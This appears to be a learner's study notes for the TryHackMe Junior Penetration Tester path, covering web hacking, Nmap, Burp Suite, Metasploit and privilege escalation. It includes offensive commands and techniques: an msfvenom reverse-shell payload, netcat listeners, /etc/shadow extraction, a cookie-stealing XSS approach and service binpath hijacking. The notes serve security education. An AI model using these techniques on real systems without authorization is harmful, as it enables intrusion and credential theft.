# TryHackMe: Junior Penetration Tester – Study Guide & Lab Notes

A comprehensive tracking repository documenting the foundational principles, tactical methodologies, and hands-on tooling covered during my path to becoming a Junior Penetration Tester.
---
## Section 1: Introduction to Cyber Security
This introductory module established the baseline definitions of modern cybersecurity paradigms, exploring the critical tension between offensive simulations and defensive infrastructure.

### 1. The Core Philosophy of Offensive Security
- Thinking Like an Adversary: Internalized the core axiom: *"To outsmart a hacker, you must think like one."* Offensive security centers on identifying bugs, weaknesses, and configuration loopholes before a malicious threat actor does.
- Controlled Exploitation: Learned to perform legal, safe simulation testing to proactively exploit software bugs and insecure architecture to strengthen organizational defenses.

### 2. Defensive Security Baselines
- Preventative Architecture: Understood the defensive team’s responsibility to prevent security breaches by managing asset inventories, implementing regular system patching, and configuring security devices (Firewalls, IDS/IPS).
- Incident Response & Mitigation: Studied how defensive operations detect active threats, conduct digital forensics, and execute incident response to quickly isolate and remediate security breaches.

### 3. Career Landscapes & Specialized Job Roles
- Penetration Testers: Focused on identifying a wide range of system vulnerabilities across an entire network or application space to ensure strong general cyber hygiene.
- Red Teamers: Explored advanced offensive roles aimed at testing an organization’s active detection and response capabilities by emulating specific threat actors, maintaining stealthy long-term access, and avoiding defensive alerts over extended operations.

##  Section 2: Introduction to Pentesting
This module explored the strict legal boundaries, ethical responsibilities, structured engagement phases, threat modeling frameworks, and defensive incident response stages that define professional penetration testing.

### 1. Ethics, Legality, and Engagement Frameworks
- The Ethical Mandate: Penetration testing is an authorized, ethically driven simulation designed to audit and analyze security defenses using the exact tools and techniques of a malicious adversary.
- Rules of Engagement (RoE): Learned that a pentest cannot begin without formal legal authorization. The scope, timelines, and testing boundaries are strictly predefined to ensure system safety and legal compliance.

### 2. Standard Testing Methodologies
- Structured Assessment Phases: Mastered the industry-standard progression of an engagement:
  1. Information Gathering (Reconnaissance)
  2. Enumeration & Vulnerability Scanning
  3. Exploitation (Gaining Access)
  4. Privilege Escalation (Maintaining & Deepening Access)
  5. Post-Exploitation & Reporting (Delivering actionable remediation insights)

### 3. Threat Modeling via STRIDE
- Deconstructing Threats: Analyzed systems using Microsoft’s STRIDE framework to categorize potential software and architectural design flaws:
  1. Spoofing (Identity theft/faking source info)
  2. Tampering (Unauthorized modification of data; violating Integrity)
  3. Repudiation (Inability to prove an action occurred)
  4. Information Disclosure (Data leaks; violating Confidentiality)
  5. Denial of Service (Crashing systems; violating Availability)
  6. Elevation of Privilege (Gaining unauthorized admin rights)

### 4. Incident Response (IR) Architecture
- The 6 Phases of IR: Studied how security teams (CSIRTs) systematically manage and recover from a live security breach:
  1. Preparation: Establishing resources, tools, and response policies.
  2. Identification: Properly detecting and validating active threat vectors.
  3. Containment: Isolating affected systems to prevent lateral movement.
  4. Eradication: Completely removing the active threat from the environment.
  5. Recovery: Conducting full system audits to return the organization to safe, normal business operations.
  6. Lessons Learned: Analyzing the incident post-mortem to patch security gaps and optimize future defenses.

##  Section 3: Introduction to Web Hacking
This massive section focused on expanding a target's web attack surface and exploiting critical logical, input validation, and database flaws within web applications.

### 1. Attack Surface Expansion & Content Discovery
- **Content Discovery Frameworks:** Explored manual, automated, and Open-Source Intelligence (OSINT) techniques to map hidden application architecture, analyzing assets like `robots.txt` and public Certificate Transparency (CT) logs via `crt.sh`.
- **Automated Fuzzing & Directory Brute-Forcing:** Mastered using tools like `ffuf`, `dirb`, and `gobuster` along with specialized wordlists (e.g., `SecLists`) to locate unlinked endpoints, hidden parameters, and administrative pathways.
- **Virtual Host & Subdomain Enumeration:** Utilized `ffuf` with custom header manipulation (`-H "Host: FUZZ.target.thm"`) and size-filtering (`-fs`) to bypass default web server routing and expose isolated development or staging environments.

### 2. Authentication, Authorization & Logic Flaws
- **Authentication Bypass & Enumeration:** Exploited verbose error messages via `ffuf` to enumerate valid site usernames. Leveraged `CrackStation` to break weak database MD5 hashes and manipulated plain-text and Base64 cookies to escalate session privileges.
- **Insecure Direct Object References (IDOR):** Exploited access control breakdowns by manipulating direct object identifiers (e.g., swapping routing parameters like `?id=1305` to `?id=1000`) within API requests to leak unauthorized customer data.
- **Server-Side Request Forgery (SSRF):** Forced application servers to make unauthorized backend HTTP requests. Bypassed input blocklists using directory traversal tricks (`x/../private`) to read restricted internal system endpoints.
- **Race Conditions:** Exploited non-deterministic timing windows in multi-threaded environments. Used **Burp Suite Repeater** to send overlapping, parallel transaction requests simultaneously, successfully bypassing standard application balance limitations.

### 3. Injection & Vulnerability Exploitation
- **Local & Remote File Inclusion (LFI/RFI):** Manipulated file path parameters to execute directory traversals (e.g., accessing `/etc/passwd`). Achieved Remote Code Execution (RCE) via RFI by serving malicious PHP scripts over a local Python HTTP server (`python3 -m http.server`).
- **Command Injection (RCE):** Leveraged unvalidated input fields to append shell operators (`&`, `;`, `|`) into system calls. Successfully fingerprinting underlying target operating systems (e.g., checking for Windows via `& dir`) to fully compromise server execution contexts.
- **Cross-Site Scripting (XSS):** Injected client-side JavaScript payloads to bypass basic filters. Formulated data-exfiltration scripts utilizing `fetch()` and `btoa(document.cookie)` to steal victim session tokens via local Netcat listeners.
- **SQL Injection (SQLi):** Exploited unvalidated input parameters communicating with backend Database Management Systems (DBMS). Analyzed out-of-band data exfiltration strategies using network protocols like **DNS**, and prioritized **Prepared Statements (Parameterized Queries)**, input sanitization, and character escaping as core remediations.

##  Section 4: Burp Suite Framework
This module focused entirely on mastering Burp Suite, the industry-standard Java-based framework for manual and automated web application vulnerability assessments, interception, and traffic manipulation.

### 1. Interception Fundamentals (Burp Proxy)
- **Traffic Control Loop:** Configured Burp Proxy as a local Man-in-the-Middle (MitM) interceptor to capture live HTTP/S client-server communication, allowing real-time parameter modifications before packet transmission.
- **Payload Delivery Mechanics:** Practiced capturing forms (e.g., support ticket submissions) and hot-patching data fields with URL-encoded cross-site scripting (`<script>alert()</script>`) payloads natively inside the proxy grid.

### 2. Manual Request Engineering (Burp Repeater)
- **Iterative Vulnerability Testing:** Leveraged Burp Repeater to duplicate, edit, and recursively resend isolated HTTP requests without reloading browser states, streamlining the process of mapping backend logic.
- **Union-Based SQLi Extraction:** Manually crafted structured Union-Based SQL payloads inside the Repeater window to force backend database errors, dynamically enumerating schema tables and columns to extract sensitive database rows.

### 3. Automated Fuzzing & Attacks (Burp Intruder)
- **High-Speed Attack Automation:** Configured Burp Intruder to run repetitive dictionary attacks and parameters fuzzing against targets using targeted injection positions.
- **Advanced Session and Token Handling:** Built customized automation **Macros** and strict session handling rules to dynamically harvest refreshed `LoginTokens` and session cookies on every iteration, resolving case-sensitive validation loops and avoiding `404/403` routing drops.

### 4. Auxiliary Utility Modules (Decoder, Comparer, Sequencer & Organizer)
- **Data Transformation & Ingestion:** Used **Decoder** to handle complex encodings (Base64, URL, Hex) and generate cryptographic hashsums. Utilized its Smart Decode feature to recursively unravel nested obfuscations back into plaintext.
- **Diffing & Entropy Analysis:** * Used **Comparer** to perform bit-by-bit and word-by-word visual differences between two HTTP responses to spot subtle variance in server behavior.
- Used **Sequencer** to calculate the statistical randomness (entropy) of session tokens, determining if application identifiers are vulnerable to predictability attacks.
- Used **Organizer** as a read-only repository to store, tag, and annotate historical HTTP messages for later analysis.

### 5. Extensibility & Environment Optimization
- **The BApp Store ecosystem:** Extended core framework capabilities by installing community-vetted modular add-ons from the BApp Store to augment target mapping workflows.
- **Multi-Language Runtime Integrations:** Integrated standalone environment engines (such as **Jython** for Python support) to enable cross-compatible custom scripting hooks using Burp’s core APIs.

##  Section 5: Network Security
This module covered passive/active reconnaissance methodologies, advanced scanning techniques using Nmap, firewall/IDS evasion strategies, and lower-level analysis of common application protocols.

### 1. Information Gathering & Surface Scanning
- **Passive Reconnaissance (OSINT):** Utilized network architecture footprints to gather organizational data without establishing direct server connections. Queried public record systems using `whois`, mapped authoritative zone files via `nslookup` and `dig`, tracked attack surfaces through **DNSDumpster**, and parsed infrastructure configurations globally using **Shodan.io**.
- **Active Reconnaissance Foundations:** Performed low-interaction network probes via native operating system tools (`ping`, `traceroute`, `telnet`, and `nc`) to verify network routing pathways, measure ICMP Echo drops, and map basic connection capabilities prior to executing heavy scans.

### 2. Nmap Scanning Engine & Stealth Architecture
- **Live Host Discovery Subnetworks:** Applied target optimization protocols to map active subnets, preserving bandwidth by filtering out offline targets using ARP scans (`-PR -sn`) inside local links, and leveraging ICMP Echo (`-PE`), Timestamp (`-PP`), and TCP SYN/ACK ping sweeps (`-PS`/`-PA`) on external subnets.
- **Core Port Scanning Dynamics:** * **TCP Connect Scan (`-sT`):** Completed the full 3-way handshake (`SYN` -> `SYN-ACK` -> `ACK`) to determine open ports; highly accurate but leaves heavy log footprints.
- **SYN Stealth Scan (`-sS`):** Aborted connections mid-handshake by sending a `RST` packet immediately after receiving a `SYN-ACK`, identifying open ports while avoiding connection logging.
- **UDP Port Scan (`-sU`):** Audited connectionless endpoints, categorizing ports based on incoming ICMP Port Unreachable error responses.
- **Advanced Evasion & Manipulation Scanning:** Explored TCP flag manipulation to audit stateless firewalls and IDS systems:
- **Null Scans (`-sN`):** Transmitted packets containing no set flags.
- **FIN Scans (`-sF`):** Transmitted packets with only the `FIN` bit set.
- **Xmas Scans (`-sX`):** Lit up the packet by setting the `FIN`, `PSH`, and `URG` flags simultaneously.
- **Evasion Tooling:** Orchestrated complex network disguises using source IP spoofing (`-S`), MAC address cloning (`--spoof-mac`), decoy noise generation (`-D`), and packet fragmentation (`-f`) to slip past defensive perimeter tools.
- **Post-Scan Fingerprinting & Automation:** Leveraged the **Nmap Scripting Engine (NSE)** (`-sC`) to identify software vulnerabilities and automate finger-printing workflows. Coupled this with OS fingerprinting (`-O`) and deep banner/service version detection (`-sV`) to output actionable results across Grepable (`-oG`) and XML (`-oX`) log files.

### 3. Protocol Analysis & Password Auditing
- **Low-Level Protocol Interactions:** Interacted natively with raw application daemons over cleartext protocols (HTTP, FTP, SMTP, POP3, IMAP, Telnet) using direct command line connections to dissect client-server message formats.
- **Cleartext Exposure Risks:** Tracked packet structures to document severe confidentiality failures where credentials and operational payloads travel unencrypted across network segments, demonstrating the critical need for cryptographic upgrades like **SSH** and **SSL/TLS**.
- **Targeted Password Cracking:** Conducted automated authentication attacks using **Hydra** to audit network infrastructure protocols (such as FTP and HTTP-POST forms) by running high-speed targeted dictionaries using flags like `-l` for usernames, `-P` for wordlists, and `-V` for full visual testing streams.

##  Section 6: Vulnerability Research & Triage
This module focused on the methodologies and reference systems used to identify software design flaws, assess their risk scoring architectures, query public exploit databases, and deliver verified Proof-of-Concept (PoC) scripts.

### 1. The Vulnerability Lifecycle & Risk Scoring
- **Anatomy of a Vulnerability:** Defined vulnerabilities as systemic flaws in software implementation, design architecture, or operational behavior that let adversaries force unauthorized commands or data extraction out of a system.
- **Risk Categorization Architecture:** Investigated how vulnerabilities are formally classified and tracked globally:
- **CVE (Common Vulnerabilities and Exposures):** Used as the standard dictionary index to identify and catalogue disclosed tracking references.
- **CVSS (Common Vulnerability Scoring System):** Analyzed the baseline metric engine used to rate severity levels from `0.0 to 10.0` based on characteristics like attack vector simplicity, privileges required, user interaction, and impact boundaries.

### 2. Manual and Automated Research Frameworks
- **Operational Triage Probes:** Documented the trade-offs between continuous high-cost commercial engines (e.g., **Nessus**) and highly granular manual inspection workflows when tracking misconfigurations and software logic gaps.
- **Vulnerability Bank Searching:** Mastered querying public tracking aggregators and exploit indices—such as **Exploit-DB (SearchSploit)**, **NVD (National Vulnerability Database)**, and **GitHub Security Advisory** grids—to map application version numbers (e.g., auditing the *ACKme Portal v1.5.2*) directly to known exploitation code vectors.

### 3. Proof-of-Concept Weaponization & Execution
- **Stand-Alone Code Auditing:** Learned to locate, download, and manually verify public exploit scripts (such as Python `.py` or Ruby files) before running them against target systems to ensure weaponized scripts safely reach their execution targets.
- **Command Line Execution Mechanics:** Executed verified standalone python scripts (`python3 exploit.py http://<Target_IP>`) to leverage Remote Code Execution (RCE) vectors.
- **Shell Interception Handling:** Paired functional exploit execution streams with dedicated local network socket listeners via **Netcat** (`nc -lvnp <Port>`), spawning reverse terminal shells to establish persistence and read target flag variables inside restricted server homes (`/home/ubuntu`).

##  Section 7: The Metasploit Framework
This module focused on leveraging the open-source Metasploit Framework (MSF) across all lifecycle phases of an engagement, from initial scanning and workspace management to memory-resident payload execution and post-exploitation.

### 1. Framework Architecture & Workspace Automation
- **Modular Engine Anatomy:** Mastered navigating Metasploit's database structures through the CLI interpreter (`msfconsole`), classifying the operational roles of core framework directories:
  - `Exploits`: Target-specific code designed to leverage known software bugs.
  - `Payloads`: Post-exploitation code blocks executed on targets upon successful intrusion.
  - `Auxiliary`: Utility tools used for port scanning, banner grabbing, and active vulnerability verification.
  - `Post`: Modules built to automate deep host enumeration and credential harvesting.
- **Database & Workspace Management:** Initialized local Postgres storage backends (`msfdb init`) to seamlessly track assets across multiple scopes, managing independent discovery metrics inside custom `workspace` layouts to automate vulnerability logs.

### 2. Payload Customization & Context Delivery (`msfvenom`)
- **Independent Payload Engineering:** Leveraged `msfvenom` to compile customized, standalone binary payloads across differing formats (e.g., executing structural creations like `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > rev_shell.elf`).
- **Multi-Platform Multi-Handlers:** Configured general-purpose `exploit/multi/handler` modules to catch incoming execution hooks across varying operating systems, aligning precise cryptographic connection architectures with remote target targets.

### 3. Stealth Post-Exploitation Agents (Meterpreter)
- **Memory-Resident Evasion:** Deployed advanced **Meterpreter** payload environments that run entirely inside a machine's volatile memory (RAM) instead of saving to physical storage blocks, successfully avoiding standard antivirus disk-scanning tools.
- **Secure Post-Exploitation Interaction:** Communicated with targets using heavily encrypted Command and Control (C2) connection protocols to prevent detection by internal network-based Intrusion Detection Systems (IDS).
- **System Looting & Credential Harvesting:** Leveraged specialized administration commands to manage sessions. Put active connections in the background (`background`) to call specialized modules like `linux/gather/hashdump` or run elevated commands like `hashdump` to extract shadow user hashes for offline decryption.

##  Section 8: Shell Mechanics & Privilege Escalation
This final foundational module focused on interactive shell engineering, stabilization protocols, and exploiting configuration, permission, and kernel flaws to elevate access from an unprivileged foothold to full administrative control (`root` / `SYSTEM`).

### 1. Shell Infrastructure & Stabilization (What the Shell?)
- **Reverse vs. Bind Shell Mechanics:** * **Reverse Shells:** Forced target systems to initiate an outbound connection back to an attacking listener (`nc -lvnp <Port>`), successfully bypassing strict stateless ingress firewall blocklists.
- **Bind Shells:** Bound a command execution listener directly to an open port on the target machine, requiring the attacker to connect to it; frequently dropped by egress network configurations.
- **Interactive TTY Stabilization Loops:** Mastered updating raw, non-interactive web shells into fully interactive TTY environments to allow safe execution of interactive binary alerts (such as password prompts) via a 3-step Python stabilization loop:
  1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
  2. Background the terminal (`Ctrl + Z`) and set local parameters: `stty raw -echo; fg`
  3. Export environment styling configurations: `export TERM=xterm`

### 2. Linux Privilege Escalation Pathways
- **Automated Environment Auditing:** Utilized automated enumeration engines like **LinPEAS** alongside manual system checks (`uname -a`, `cat /etc/passwd`, `env`) to map out target privilege vector paths.
- **SUID/SGID Binary Exploitation:** Queried for files running with elevated execution bits (`find / -perm -u=s -type f 2>/dev/null`) to match misconfigured binaries (such as an elevated `find` or `base64` utility) directly to bypass blueprints on **GTFOBins**.
- **Shadow File Extraction:** Successfully bypassed standard protection architectures by reading or decoding the `/etc/shadow` file via elevated access loopholes, pulling password hashes to run through offline dictionary cracking via **John the Ripper** (`john --wordlist=rockyou.txt`).
- **Sudo Permissions & Cron Tasks:** Audited misconfigured user authorization lists (`sudo -l`) to identify administrative execution commands without passwords. Scanned automated system files (`/etc/crontab`) to replace writable system script objects with weaponized shell links.

### 3. Windows Privilege Escalation Pathways
- **Target Vector Discovery Automation:** Ran automated suggestion modules, including **WES-NG (Windows Exploit Suggester - Next Generation)** against text logs (`systeminfo > systeminfo.txt`) and Metasploit's `multi/recon/local_exploit_suggester` to discover missing system hotpatches.
- **Service Configuration Exploitation:** * **Unquoted Service Paths:** Exploited improperly formatted execution paths containing space gaps (e.g., `C:\Program Files\Development Service\Run.exe`) by planting a malicious binary (`C:\Program Files\Development.exe`) to hijack execution flows when services restart.
- **Insecure Service Registry/Permissions:** Altered underlying binary pathways (`binpath`) of vulnerable services using administrative query lines (`sc config <Service> binpath= "..."`) to force execution of custom payloads.
- **Token Impersonation & Potato Exploits:** Investigated Token Kidnapping and elevated privilege tokens using tools like **RogueWinRM** and classic **Potato Exploits** to force local systems to route administrative actions directly through unauthorized session handlers.


---

##  Continuous Learning & Next Steps
Completing this Junior Penetration Tester path provided a solid blueprint of hands-on offensive methodologies, legal frameworks, and exploitation mechanics. Moving forward, I am actively applying these concepts through dedicated bug bounty platforms like Bugcrowd and HackerOne, deploying advanced testing labs on Kali Linux, and preparing for industry-recognized practical security certifications. 
